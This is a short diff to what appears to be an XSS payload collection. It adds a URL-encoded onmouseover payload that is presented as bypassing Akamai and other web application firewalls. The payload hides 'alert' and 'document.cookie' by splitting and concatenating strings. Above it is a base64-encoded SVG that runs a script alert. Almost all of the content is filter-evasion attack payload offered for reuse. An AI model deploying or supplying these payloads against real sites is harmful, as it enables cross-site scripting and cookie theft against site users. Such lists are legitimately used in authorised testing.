@@ -20,3 +20,9 @@ Encoded svg file save as svg
   <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICA8c2NyaXB0PgogICAgYWxlcnQoJ1RoaXMgaXMgYW4gWFNTIGF0dGFjayEnKTsKICA8L3NjcmlwdD4KICA8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIzIiBmaWxsPSJyZWQiIC8+Cjwvc3ZnPg==" />
 </svg>
 
+
+Bypass XSS WAF and Filters and Akamai
+src,svg,autofocus,iframe,img,<>  all blok
+use this payload add to your list
+
+%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
